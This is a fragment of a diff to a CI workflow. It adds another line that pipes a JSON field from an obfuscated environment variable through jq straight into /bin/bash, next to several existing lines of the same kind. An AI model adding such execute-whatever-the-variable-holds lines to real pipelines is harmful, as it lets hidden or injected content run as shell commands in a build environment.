@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$tbe971" | jq -r .zul89291 | /bin/bash
           echo $hzqqj31 | jq -r .e5619 | /bin/bash
           printf '%s' "$ugprb76320" | jq -r .yzlmq434 | /bin/bash
+          echo $zu23 | jq -r .qmrox3 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
